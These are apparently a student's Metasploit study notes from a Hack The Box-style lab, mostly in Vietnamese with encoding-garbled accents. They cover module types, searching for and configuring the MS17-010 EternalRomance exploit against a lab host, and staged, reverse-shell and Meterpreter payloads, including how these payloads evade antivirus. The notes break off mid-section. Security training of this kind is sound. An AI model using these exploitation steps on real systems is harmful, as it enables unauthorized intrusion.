metasploit 


/usr/share/metasploit-framewok

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

TÃ¬m hiá»ƒu sÆ¡ qua vá» metasploit 

Metasploit Pro : commercial use , paid Subscription, Enterprise 

Metasploit Framework : Open source, Community Driven, Free 

CÃ³ bao nhiÃªu module 
  naruto3co@htb[/htb]$ ls /usr/share/metasploit-framework/modules
    auxiliary  encoders  evasion  exploits  nops  payloads  post

Plguin ? 
  naruto3co@htb[/htb]$ ls /usr/share/metasploit-framework/plugins/
    aggregator.rb      ips_filter.rb  openvas.rb           sounds.rb
    alias.rb           komand.rb      pcap_log.rb          sqlmap.rb
    auto_add_route.rb  lab.rb         request.rb           thread.rb
    beholder.rb        libnotify.rb   rssfeed.rb           token_adduser.rb
    db_credcollect.rb  msfd.rb        sample.rb            token_hunter.rb
    db_tracker.rb      msgrpc.rb      session_notifier.rb  wiki.rb
    event_tester.rb    nessus.rb      session_tagger.rb    wmap.rb
    ffautoregen.rb     nexpose.rb     socket_logger.rb

Plugin trong Metasploit lÃ  cÃ¡c tiá»‡n Ã­ch má»Ÿ rá»™ng báº±ng Ruby, náº¡p báº±ng lá»‡nh load, giÃºp bá»• sung chá»©c nÄƒng vÃ  tá»± Ä‘á»™ng hÃ³a trong msfconsole.
  VÃ­ dá»¥:
    nmap â†’ cháº¡y Nmap trá»±c tiáº¿p trong Metasploit, import káº¿t quáº£.
    session_tagger â†’ tá»± Ä‘á»™ng gáº¯n nhÃ£n cho session.
    event_tagger â†’ log & gáº¯n tháº» sá»± kiá»‡n.
    log â†’ ghi log hoáº¡t Ä‘á»™ng.
    ğŸ‘‰ Hiá»ƒu Ä‘Æ¡n giáº£n: plugin = â€œadd-onâ€ giÃºp msfconsole máº¡nh vÃ  tiá»‡n hÆ¡n.

Script
  Chá»©c nÄƒng Meterpreter vÃ  cÃ¡c script há»¯u Ã­ch khÃ¡c.
    naruto3co@htb[/htb]$ ls /usr/share/metasploit-framework/scripts/
    meterpreter  ps  resource  shell

Tools
Command-line utilities that can be called directly from the msfconsole menu.
  naruto3co@htb[/htb]$ ls /usr/share/metasploit-framework/tools/
    context  docs     hardware  modules   payloads
    dev      exploit  memdump   password  recon



Make sure you are using the latest version
  naruto3co@htb[/htb]$ sudo apt update && sudo apt install metasploit-framework

The first steps Ã­ to gather information about the target: what it is, which technologies and versions are being used, and whether they have vulnerability . -> we need Enumeration 
MSF engagement structure 

Engagement Structure
â”‚
â”œâ”€â”€ Enumeration
â”‚   â”œâ”€â”€ Service Validation
â”‚   â”‚   â”œâ”€â”€ Passive Scanning
â”‚   â”‚   â”‚   â”œâ”€â”€ OSINT
â”‚   â”‚   â”‚   â”œâ”€â”€ Interacting with services legitimately
â”‚   â”‚   â”‚   â””â”€â”€ Whois / DNS records
â”‚   â”‚   â””â”€â”€ Active Scanning
â”‚   â”‚       â”œâ”€â”€ nMap / Nessus / NexPose scans
â”‚   â”‚       â”œâ”€â”€ Web service identification tools
â”‚   â”‚       â””â”€â”€ Built-with identification tools
â”‚   â””â”€â”€ Vulnerability Research
â”‚       â”œâ”€â”€ VulnDB (GUI)
â”‚       â”œâ”€â”€ Rapid7 (GUI)
â”‚       â”œâ”€â”€ SearchSploit (CLI)
â”‚       â””â”€â”€ Google Dorking (GUI)
â”‚
â”œâ”€â”€ Preparation
â”‚   â”œâ”€â”€ Code Auditing
â”‚   â”œâ”€â”€ Dependency Check
â”‚   â””â”€â”€ Importing Custom Modules
â”‚
â”œâ”€â”€ Exploitation
â”‚   â”œâ”€â”€ Run Module Locally
â”‚   â”œâ”€â”€ Set Parameters
â”‚   â”‚   â”œâ”€â”€ Options (> show options)
â”‚   â”‚   â”‚   â”œâ”€â”€ URI
â”‚   â”‚   â”‚   â”œâ”€â”€ PROXIES
â”‚   â”‚   â”‚   â”œâ”€â”€ RHOST / RPORT
â”‚   â”‚   â”‚   â”œâ”€â”€ USERNAMES / PASSWORDS
â”‚   â”‚   â”‚   â”œâ”€â”€ DICTIONARIES
â”‚   â”‚   â”‚   â””â”€â”€ SESSION
â”‚   â”‚   â”œâ”€â”€ Payloads (> show payloads)
â”‚   â”‚   â”‚   â”œâ”€â”€ METERPRETER
â”‚   â”‚   â”‚   â”œâ”€â”€ SHELL BINDS
â”‚   â”‚   â”‚   â”œâ”€â”€ REVERSE SHELLS
â”‚   â”‚   â”‚   â”œâ”€â”€ EXE
â”‚   â”‚   â”‚   â”œâ”€â”€ LINUX
â”‚   â”‚   â”‚   â”œâ”€â”€ WINDOWS
â”‚   â”‚   â”‚   â”œâ”€â”€ MACOSX
â”‚   â”‚   â”‚   â””â”€â”€ OTHERS
â”‚   â”‚   â””â”€â”€ Targets (> show targets)
â”‚   â”‚       â””â”€â”€ Set target [OS]
â”‚   â””â”€â”€ Run
â”‚
â”œâ”€â”€ Privilege Escalation
â”‚   â”œâ”€â”€ Vulnerability Research
â”‚   â”œâ”€â”€ Credential Gathering
â”‚   â””â”€â”€ Token Impersonation
â”‚
â””â”€â”€ Post-Exploitation
    â”œâ”€â”€ Pivoting to Other Systems
    â”œâ”€â”€ Credential Gathering
    â”œâ”€â”€ Data Exfiltration
    â””â”€â”€ Cleanup

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

Once we are in the msfconsole, we can select modules available Metasploit. Each of them is structured into folders, which will look like this 

Syntax
  <No.> <type>/<os>/<service>/<name>
  794   exploit/windows/ftp/scriptftp_list

How many type of "type" 
  Auxiliary: QuÃ©t (scanning), fuzzing, sniffing vÃ  cÃ¡c kháº£ nÄƒng quáº£n trá»‹. Cung cáº¥p há»— trá»£ vÃ  chá»©c nÄƒng bá»• sung.
  Encoders: Äáº£m báº£o payload Ä‘Æ°á»£c giá»¯ nguyÃªn váº¹n khi tá»›i Ä‘Ã­ch.
  Exploits: ÄÆ°á»£c Ä‘á»‹nh nghÄ©a lÃ  cÃ¡c module khai thÃ¡c lá»— há»•ng, cho phÃ©p triá»ƒn khai payload.
  NOPs: (No Operation code) Giá»¯ cho kÃ­ch thÆ°á»›c payload nháº¥t quÃ¡n giá»¯a cÃ¡c láº§n khai thÃ¡c.
  Payloads: Äoáº¡n mÃ£ cháº¡y tá»« xa vÃ  gá»i ngÆ°á»£c vá» mÃ¡y táº¥n cÃ´ng Ä‘á»ƒ thiáº¿t láº­p káº¿t ná»‘i (hoáº·c shell).
  Plugins: CÃ¡c script bá»• sung cÃ³ thá»ƒ Ä‘Æ°á»£c tÃ­ch há»£p trong quÃ¡ trÃ¬nh kiá»ƒm thá»­ vá»›i msfconsole vÃ  cÃ¹ng tá»“n táº¡i.
  Post: Nhiá»u module há»— trá»£ thu tháº­p thÃ´ng tin, má»Ÿ rá»™ng táº¥n cÃ´ng (pivot), vÃ  cÃ¡c hoáº¡t Ä‘á»™ng háº­u khai thÃ¡c khÃ¡c.

Há»‡ Ä‘iá»u hÃ nh
  Tháº» Há»‡ Ä‘iá»u hÃ nh chá»‰ Ä‘á»‹nh há»‡ Ä‘iá»u hÃ nh vÃ  kiáº¿n trÃºc mÃ  mÃ´-Ä‘un Ä‘Æ°á»£c táº¡o ra. Táº¥t nhiÃªn, cÃ¡c há»‡ Ä‘iá»u hÃ nh khÃ¡c nhau yÃªu cáº§u mÃ£ khÃ¡c nhau Ä‘á»ƒ cháº¡y Ä‘á»ƒ cÃ³ Ä‘Æ°á»£c káº¿t quáº£ mong muá»‘n.

Dá»‹ch vá»¥
  Tháº» Dá»‹ch vá»¥ Ä‘á» cáº­p Ä‘áº¿n dá»‹ch vá»¥ dá»… bá»‹ táº¥n cÃ´ng Ä‘ang cháº¡y trÃªn mÃ¡y má»¥c tiÃªu. Äá»‘i vá»›i má»™t sá»‘ mÃ´-Ä‘un, cháº³ng háº¡n nhÆ° mÃ´-Ä‘un phá»¥ trá»£ hoáº·c mÃ´-Ä‘un sau, tháº» nÃ y cÃ³ thá»ƒ Ä‘á» cáº­p Ä‘áº¿n má»™t hoáº¡t Ä‘á»™ng chung hÆ¡n nhÆ° thu tháº­p, vÃ­ dá»¥ nhÆ° thu tháº­p thÃ´ng tin Ä‘Äƒng nháº­p.

TÃªn
  Cuá»‘i cÃ¹ng, tháº» TÃªn giáº£i thÃ­ch hÃ nh Ä‘á»™ng thá»±c táº¿ cÃ³ thá»ƒ Ä‘Æ°á»£c thá»±c hiá»‡n báº±ng mÃ´-Ä‘un nÃ y Ä‘Æ°á»£c táº¡o cho má»™t má»¥c Ä‘Ã­ch cá»¥ thá»ƒ.



Searching for Modules
  msf6 > search eternalromance
  Matching Modules
  ================
  
     #  Name                                  Disclosure Date  Rank    Check  Description
     -  ----                                  ---------------  ----    -----  -----------
     0  exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
     1  auxiliary/admin/smb/ms17_010_command  2017-03-14       normal  No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution

  msf6 > search eternalromance type:exploit
  Matching Modules
  ================
     #  Name                                  Disclosure Date  Rank    Check  Description
     -  ----                                  ---------------  ----    -----  -----------
     0  exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution


ChÃºng ta cÅ©ng cÃ³ thá»ƒ lÃ m cho tÃ¬m kiáº¿m trá»Ÿ nÃªn tá»•ng quÃ¡t hÆ¡n má»™t chÃºt vÃ  thu háº¹p nÃ³ thÃ nh má»™t danh má»¥c dá»‹ch vá»¥. VÃ­ dá»¥, Ä‘á»‘i vá»›i CVE, chÃºng ta cÃ³ thá»ƒ chá»‰ Ä‘á»‹nh nÄƒm (cve:<year>), ná»n táº£ng Windows (platform:<os>), loáº¡i mÃ´-Ä‘un chÃºng ta muá»‘n tÃ¬m (type:<auxiliary/exploit/post>), thá»© háº¡ng Ä‘á»™ tin cáº­y (rank:<rank>) vÃ  tÃªn tÃ¬m kiáº¿m (<pattern>). Äiá»u nÃ y sáº½ thu háº¹p káº¿t quáº£ tÃ¬m kiáº¿m xuá»‘ng chá»‰ cÃ²n nhá»¯ng káº¿t quáº£ khá»›p vá»›i táº¥t cáº£ cÃ¡c yáº¿u tá»‘ trÃªn.

MSF - Specific Search
  msf6 > search type:exploit platform:windows cve:2021 rank:excellent microsoft
  Matching Modules
  ================
  
     #  Name                                            Disclosure Date  Rank       Check  Description
     -  ----                                            ---------------  ----       -----  -----------
     0  exploit/windows/http/exchange_proxylogon_rce    2021-03-02       excellent  Yes    Microsoft Exchange ProxyLogon RCE
     1  exploit/windows/http/exchange_proxyshell_rce    2021-04-06       excellent  Yes    Microsoft Exchange ProxyShell RCE
     2  exploit/windows/http/sharepoint_unsafe_control  2021-05-11       excellent  Yes    Microsoft SharePoint Unsafe Control and ViewState RCE


Module Selection
To select our first module, we first need to find one. Let's suppose that we have a target running a version of SMB vulnerable to EternalRomance (MS17_010) exploits. We have found that SMB server port 445 is open upon scanning the target.
  naruto3co@htb[/htb]$ nmap -sV 10.10.10.40
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-13 21:38 UTC
    Stats: 0:00:50 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
    Nmap scan report for 10.10.10.40
    Host is up (0.051s latency).
    Not shown: 991 closed ports
    PORT      STATE SERVICE      VERSION
    135/tcp   open  msrpc        Microsoft Windows RPC
    139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
    445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
    49152/tcp open  msrpc        Microsoft Windows RPC
    49153/tcp open  msrpc        Microsoft Windows RPC
    49154/tcp open  msrpc        Microsoft Windows RPC
    49155/tcp open  msrpc        Microsoft Windows RPC
    49156/tcp open  msrpc        Microsoft Windows RPC
    49157/tcp open  msrpc        Microsoft Windows RPC
    Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 60.87 seconds

LÆ°u Ã½ á»Ÿ Ä‘Ã¢y lÃ  : Port 445 má»Ÿ, Ä‘Ã¢y lÃ  SMB service, thÆ°á»ng liÃªn quan Ä‘áº¿n cÃ¡c lá»— há»•ng ná»•i tiáº¿ng nhÆ° MS17-010 (EternalBlue, EternalRomance, EternalChampion, â€¦). => tÃ¬m cÃ¡c lá»— há»•ng liÃªn quan trÃªn msfconsole 

  msf6 > search ms17_010
  Matching Modules
  ================
     #  Name                                      Disclosure Date  Rank     Check  Description
     -  ----                                      ---------------  ----     -----  -----------
     0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
     1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
     2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
     3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection

Tiáº¿p theo, chá»n module phÃ¹ há»£p. tháº¥y ráº±ng nmap nháº­n Ä‘á»‹nh Ä‘Ã¢y lÃ  windows 7 Ä‘áº¿n 10 

Sá»­ dá»¥ng module
  msf6 > use 0
  msf6 exploit(windows/smb/ms17_010_psexec) > options
  Module options (exploit/windows/smb/ms17_010_psexec): 
     Name                  Current Setting                          Required  Description
     ----                  ---------------                          --------  -----------
     DBGTRACE              false                                    yes       Show extra debug trace info
     LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction
     NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)
     NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check
                           rdlists/named_pipes.txt
     RHOSTS                                                         yes       The target host(s), see https://github.com/rapid7/metasploit-framework
                                                                              /wiki/Using-Metasploit
     RPORT                 445                                      yes       The Target port (TCP)
     SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing
     SERVICE_DISPLAY_NAME                                           no        The service display name
     SERVICE_NAME                                                   no        The service name
     SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a no
                                                                              rmal read/write folder share
     SMBDomain             .                                        no        The Windows domain to use for authentication
     SMBPass                                                        no        The password for the specified username
     SMBUser                                                        no        The username to authenticate as
  Payload options (windows/meterpreter/reverse_tcp):
     Name      Current Setting  Required  Description
     ----      ---------------  --------  -----------
     EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
     LHOST                      yes       The listen address (an interface may be specified)
     LPORT     4444             yes       The listen port
  Exploit target:
     Id  Name
     --  ----
     0   Automatic

Ta tháº¥y tháº» No. ráº¥t helpful , chá»‰ cáº§n nháº­p sá»‘ cá»§a nÃ³ thay vÃ¬ nháº­p tÃªn cáº£ module 
Chá»n module xong rá»“i thÃ¬ ta cÃ³ thá»ƒ xem thÃ´ng tin cá»§a module Ä‘Ã³
  msf6 exploit(windows/smb/ms17_010_psexec) > info
         Name: MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
       Module: exploit/windows/smb/ms17_010_psexec
     Platform: Windows
         Arch: x86, x64
   Privileged: No
      License: Metasploit Framework License (BSD)
         Rank: Normal
    Disclosed: 2017-03-14
  Provided by:
    sleepya
    zerosum0x0
    Shadow Brokers
    Equation Group
  Available targets:
    Id  Name
    --  ----
    0   Automatic
    1   PowerShell
    2   Native upload
    3   MOF upload
  Check supported:
    Yes
  Basic options:
    Name                  Current Setting                          Required  Description
    ----                  ---------------                          --------  -----------
    DBGTRACE              false                                    yes       Show extra debug trace info
    LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction
    NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)
    NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check
                          rdlists/named_pipes.txt
    RHOSTS                                                         yes       The target host(s), see https://github.com/rapid7/metasploit-framework/
                                                                             wiki/Using-Metasploit
    RPORT                 445                                      yes       The Target port (TCP)
    SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing
    SERVICE_DISPLAY_NAME                                           no        The service display name
    SERVICE_NAME                                                   no        The service name
    SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a nor
                                                                             mal read/write folder share
    SMBDomain             .                                        no        The Windows domain to use for authentication
    SMBPass                                                        no        The password for the specified username
    SMBUser                                                        no        The username to authenticate as
  Payload information:
    Space: 3072
  Description:
    This module will exploit SMB with vulnerabilities in MS17-010 to 
    achieve a write-what-where primitive. This will then be used to 
    overwrite the connection session information with as an 
    Administrator session. From there, the normal psexec payload code 
    execution is done. Exploits a type confusion between Transaction and 
    WriteAndX requests and a race condition in Transaction requests, as 
    seen in the EternalRomance, EternalChampion, and EternalSynergy 
    exploits. This exploit chain is more reliable than the EternalBlue 
    exploit, but requires a named pipe.
  References:
    https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010
    https://nvd.nist.gov/vuln/detail/CVE-2017-0143
    https://nvd.nist.gov/vuln/detail/CVE-2017-0146
    https://nvd.nist.gov/vuln/detail/CVE-2017-0147
    https://github.com/worawit/MS17-010
    https://hitcon.org/2017/CMT/slide-files/d2_s2_r0.pdf
    https://blogs.technet.microsoft.com/srd/2017/06/29/eternal-champion-exploit-analysis/
  Also known as:
    ETERNALSYNERGY
    ETERNALROMANCE
    ETERNALCHAMPION
    ETERNALBLUE

Chá»— nÃ y quan tÃ¢m má»—i basic Option nhÃ© ae. chá»— nÃ o required lÃ  YES thÃ¬ ae cáº§n Ä‘iá»n nhÃ© 

Modules
  msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
    RHOSTS => 10.10.10.40

  msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
  RHOSTS => 10.10.10.40

Once everything is set and ready to go, we can proceed to launch the attack. Note that the payload was not set here, as the default one is sufficient for this demonstration.

  msf6 exploit(windows/smb/ms17_010_psexec) > run

TÃ´i thÆ°á»ng dÃ¹ng msf6 >check Ä‘á»ƒ kiá»ƒm tra trÆ°á»›c khi >run Ä‘Ã³ 
  exploit(windows/smb/ms17_010_psexec) > check


DÃ¹ng show target khi nÃ o 
  msf6 > use exploit/windows/smb/ms17_010_psexec
  msf6 exploit(windows/browser/ie_execcommand_uaf) > show targets
  
  Exploit targets: 
     Id  Name
     --  ----
     0   Automatic
     1   IE 7 on Windows XP SP3
     2   IE 8 on Windows XP SP3
     3   IE 7 on Windows Vista
     4   IE 8 on Windows Vista
     5   IE 8 on Windows 7
     6   IE 9 on Windows 7

show targets chÃ¨n ngay sau khi chá»n exploit, Ä‘á»ƒ xÃ¡c Ä‘á»‹nh OS nÃ o sáº½ khai thÃ¡c.
Táº¡i sao pháº£i chá»n target trong khi msfconsole cÃ³ kháº£ nÄƒng tá»± Ä‘á»™ng tÃ¬m Ä‘Æ°á»£c. Giáº£m khÃ¡ nÄƒng crash, giáº£m thá»i gian, pháº¡m vi sá»­ dá»¥ng metasploit 

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

Payload
There are three different types of payload modules in the MSF : Single, Stagers and Stages 

Singles (Payload Ä‘Æ¡n / Inline payload)
  Chá»©a cáº£ exploit + shellcode trong cÃ¹ng má»™t gÃ³i.
  Æ¯u Ä‘iá»ƒm: á»•n Ä‘á»‹nh hÆ¡n, chá»‰ cáº§n gá»­i má»™t láº§n lÃ  cháº¡y ngay (self-contained).
  NhÆ°á»£c Ä‘iá»ƒm: kÃ­ch thÆ°á»›c lá»›n, má»™t sá»‘ exploit khÃ´ng chá»‹u Ä‘Æ°á»£c.
  VÃ­ dá»¥: táº¡o user má»›i, khá»Ÿi cháº¡y process.
Stagers (TrÃ¬nh khá»Ÿi táº¡o)
  Nhiá»‡m vá»¥: thiáº¿t láº­p káº¿t ná»‘i giá»¯a attacker â†” victim.
  Nhá» gá»n, Ä‘Ã¡ng tin cáº­y.
  Sau khi cháº¡y, nÃ³ má»Ÿ Ä‘Æ°á»ng cho Stages táº£i xuá»‘ng.
Stages (ThÃ nh pháº§n táº£i xuá»‘ng)
  LÃ  pháº§n má»Ÿ rá»™ng Ä‘Æ°á»£c táº£i vá» bá»Ÿi Stager.
  KhÃ´ng giá»›i háº¡n kÃ­ch thÆ°á»›c, cung cáº¥p tÃ­nh nÄƒng nÃ¢ng cao nhÆ° Meterpreter, VNC Injection...
  QuÃ¡ trÃ¬nh: Stager táº£i â€œmiddle stagerâ€ â†’ middle stager táº£i toÃ n bá»™ Stage.

VÃ­ dá»¥ phÃ¢n biá»‡t
  windows/shell_bind_tcp â†’ payload Ä‘Æ¡n (single).
  windows/shell/bind_tcp â†’ gá»“m stager (bind_tcp) + stage (shell).

ğŸ‘‰ TÃ³m láº¡i:
  Single = táº¥t cáº£ trong má»™t, cháº¡y ngay.
  Stager = má»Ÿ kÃªnh káº¿t ná»‘i.
  Stage = pháº§n táº£i vá» vá»›i tÃ­nh nÄƒng nÃ¢ng cao.

Staged Payload 

Staged Payloads lÃ  gÃ¬
  LÃ  loáº¡i payload Ä‘Æ°á»£c chia nhá» thÃ nh nhiá»u pháº§n (stages), má»—i pháº§n Ä‘áº£m nhiá»‡m má»™t nhiá»‡m vá»¥ riÃªng, sau Ä‘Ã³ káº¿t há»£p chuá»—i láº¡i thÃ nh toÃ n bá»™ cuá»™c táº¥n cÃ´ng.
Má»¥c tiÃªu: cuá»‘i cÃ¹ng váº«n lÃ  cÃ³ remote access (shell) vÃ o mÃ¡y náº¡n nhÃ¢n.
Æ¯u Ä‘iá»ƒm
  Nhá» gá»n, kÃ­n Ä‘Ã¡o â†’ giÃºp nÃ© Antivirus (AV) / Intrusion Prevention System (IPS).
  Dá»… truyá»n qua máº¡ng vÃ¬ khÃ´ng pháº£i gá»­i 1 payload quÃ¡ lá»›n ngay tá»« Ä‘áº§u.
Stage0 (giai Ä‘oáº¡n Ä‘áº§u)
  LÃ  Ä‘oáº¡n shellcode nhá» gá»­i Ä‘áº§u tiÃªn Ä‘áº¿n dá»‹ch vá»¥ dá»… bá»‹ táº¥n cÃ´ng.
  Nhiá»‡m vá»¥ duy nháº¥t: táº¡o káº¿t ná»‘i ngÆ°á»£c tá»« mÃ¡y náº¡n nhÃ¢n vá» attacker.
  ÄÃ¢y chÃ­nh lÃ  reverse connection.
VÃ­ dá»¥ trong Metasploit
  Payload thÆ°á»ng tháº¥y:
    reverse_tcp
    reverse_https
    bind_tcp
CÃ³ thá»ƒ xem báº±ng lá»‡nh: show payloads

TÃ³m láº¡i: Staged Payload = payload theo tá»«ng giai Ä‘oáº¡n. Gá»­i trÆ°á»›c 1 shellcode nhá» Ä‘á»ƒ má»Ÿ káº¿t ná»‘i (Stage0), rá»“i láº§n lÆ°á»£t táº£i thÃªm pháº§n lá»›n (Stage1, Stage2â€¦) â†’ vá»«a hiá»‡u quáº£, vá»«a khÃ³ bá»‹ AV phÃ¡t hiá»‡n.

Reverse Connections (Káº¿t ná»‘i ngÆ°á»£c)
  Æ¯u Ä‘iá»ƒm: khi náº¡n nhÃ¢n chá»§ Ä‘á»™ng káº¿t ná»‘i ra ngoÃ i (vá» phÃ­a attacker) thÃ¬ dá»… qua máº·t há»‡ thá»‘ng phÃ²ng thá»§, vÃ¬ traffic thÆ°á»ng Ä‘Æ°á»£c tin tÆ°á»Ÿng náº¿u Ä‘i tá»« bÃªn trong (ná»™i bá»™) ra ngoÃ i â†’ gá»i lÃ  security trust zone.
  NhÆ°á»£c Ä‘iá»ƒm: khÃ´ng pháº£i lÃºc nÃ o cÅ©ng qua máº·t Ä‘Æ°á»£c, váº«n cÃ³ thá»ƒ bá»‹ thiáº¿t bá»‹ an ninh phÃ¡t hiá»‡n. Attacker cáº§n cáº©n trá»ng.
Stage0 vÃ  Stage1
  Stage0: Ä‘oáº¡n code nhá», nhiá»‡m vá»¥:
  Táº¡o káº¿t ná»‘i á»•n Ä‘á»‹nh giá»¯a attacker â†” victim.
  Chuáº©n bá»‹ sáºµn Ä‘á»ƒ táº£i thÃªm payload khÃ¡c vÃ o bá»™ nhá»›.
  Stage1: payload lá»›n hÆ¡n, Ä‘Æ°á»£c gá»­i sau khi Stage0 thÃ nh cÃ´ng, thÆ°á»ng cung cáº¥p shell access cho attacker.
Meterpreter Payload
  LÃ  payload Ä‘áº·c biá»‡t trong Metasploit, dá»±a trÃªn DLL injection.
  Äáº·c tÃ­nh:
    Cháº¡y hoÃ n toÃ n trong RAM (khÃ´ng ghi xuá»‘ng á»• cá»©ng).
    KhÃ³ phÃ¡t hiá»‡n báº±ng ká»¹ thuáº­t forensics truyá»n thá»‘ng.
    Giá»¯ káº¿t ná»‘i á»•n Ä‘á»‹nh, dai dáº³ng, ká»ƒ cáº£ khi há»‡ thá»‘ng thay Ä‘á»•i hoáº·c reboot.
  Sau khi cháº¡y, táº¡o ra má»™t Meterpreter session (giao diá»‡n riÃªng).
  Chá»©c nÄƒng ná»•i báº­t:
    Keylogging (ghi láº¡i phÃ­m báº¥m).
    Dump password hashes.
    Ghi Ã¢m qua micro.
    Chá»¥p mÃ n hÃ¬nh.
    Giáº£ máº¡o token tiáº¿n trÃ¬nh.
    Táº£i / gá»¡ plugin linh hoáº¡t.
  ğŸ‘‰ TÃ³m láº¡i:
  Reverse connection giÃºp attacker dá»… lá»t qua firewall.
  Stage0 â†’ Stage1 lÃ  cÆ¡ cháº¿ staged payload Ä‘iá»ƒn hÃ¬nh: nhá» gá»n ban Ä‘áº§u, rá»“i má»Ÿ rá»™ng.
  Meterpreter lÃ  payload â€œxá»‹nâ€ nháº¥t cá»§a Metasploit: linh hoáº¡t, stealth, cháº¡y trong RAM, nhiá»u cÃ´ng cá»¥ táº¥n cÃ´ng tÃ­ch há»£p.

| TiÃªu chÃ­            | **Payload thÆ°á»ng (Shell Payloads)**                                             | **Meterpreter Payload**                                                                 |
| ------------------- | ------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------- |
| **CÃ¡ch hoáº¡t Ä‘á»™ng**  | ThÆ°á»ng chá»‰ má»Ÿ **command shell** (cmd, sh) cÆ¡ báº£n sau khi khai thÃ¡c thÃ nh cÃ´ng.  | Sá»­ dá»¥ng **DLL injection**, cháº¡y trá»±c tiáº¿p trong **RAM**, khÃ´ng ghi xuá»‘ng á»• cá»©ng.        |
| **Chá»©c nÄƒng**       | Háº¡n cháº¿: chá»‰ gÃµ lá»‡nh cÆ¡ báº£n trÃªn mÃ¡y náº¡n nhÃ¢n.                                  | Ráº¥t phong phÃº: keylogger, chá»¥p mÃ n hÃ¬nh, dump hash, micro tapping, token impersonationâ€¦ |
| **TÃ­nh áº©n mÃ¬nh**    | Dá»… bá»‹ phÃ¡t hiá»‡n bá»Ÿi AV/IPS hoáº·c forensic tools vÃ¬ shellcode thÆ°á»ng ghi dáº¥u váº¿t. | **KhÃ³ phÃ¡t hiá»‡n**: khÃ´ng Ä‘á»ƒ láº¡i file trÃªn á»• cá»©ng, tá»“n táº¡i trong bá»™ nhá»›.                 |
| **á»”n Ä‘á»‹nh káº¿t ná»‘i** | Dá»… máº¥t káº¿t ná»‘i náº¿u máº¡ng cháº­p chá»n hoáº·c victim reboot.                           | Káº¿t ná»‘i á»•n Ä‘á»‹nh, cÃ³ thá»ƒ tá»“n táº¡i qua reboot, Ã­t bá»‹ giÃ¡n Ä‘oáº¡n.                            |
| **Má»Ÿ rá»™ng**         | KhÃ´ng há»— trá»£ plugin, cá»‘ Ä‘á»‹nh chá»©c nÄƒng.                                         | CÃ³ thá»ƒ táº£i/gá»¡ **plugin** hoáº·c script Ä‘á»™ng â†’ linh hoáº¡t.                                  |
| **Ká»‹ch báº£n dÃ¹ng**   | PhÃ¹ há»£p khi chá»‰ cáº§n **quyá»n truy cáº­p nhanh**, Ã­t thao tÃ¡c.                      | PhÃ¹ há»£p khi muá»‘n **kiá»ƒm soÃ¡t lÃ¢u dÃ i** vÃ  thá»±c hiá»‡n **post-exploitation nÃ¢ng cao**.     |

NOTE 
  msfconsole chá»‰ lÃ  giao diá»‡n chÃ­nh cá»§a Metasploit (CLI), báº¡n cÃ³ thá»ƒ chá»n báº¥t ká»³ payload nÃ o trong Ä‘Ã³:
    Payload thÆ°á»ng (shell)
    Hoáº·c Meterpreter
  Payload thÆ°á»ng (Shell payloads)
    VÃ­ dá»¥: windows/shell/reverse_tcp, linux/x86/shell_bind_tcp.
    Sau khi exploit thÃ nh cÃ´ng â†’ báº¡n nháº­n Ä‘Æ°á»£c command shell cÆ¡ báº£n (cmd.exe trÃªn Windows, /bin/sh trÃªn Linux).
  Meterpreter payloads
    VÃ­ dá»¥: windows/meterpreter/reverse_tcp.
    Sau khi exploit thÃ nh cÃ´ng â†’ báº¡n nháº­n Ä‘Æ°á»£c Meterpreter session (giao diá»‡n riÃªng trong msfconsole).
    Session nÃ y nhiá»u tÃ­nh nÄƒng hÆ¡n háº³n so vá»›i shell payload.

TÃ¬m kiáº¿m Payloads trong Metasploit
  Khi chá»n payload, cáº§n xÃ¡c Ä‘á»‹nh má»¥c tiÃªu mÃ¬nh muá»‘n lÃ m gÃ¬ trÃªn mÃ¡y náº¡n nhÃ¢n.
    VÃ­ dá»¥: muá»‘n duy trÃ¬ quyá»n truy cáº­p lÃ¢u dÃ i (persistence) â†’ nÃªn chá»n Meterpreter payload.
âš¡ Æ¯u Ä‘iá»ƒm cá»§a Meterpreter
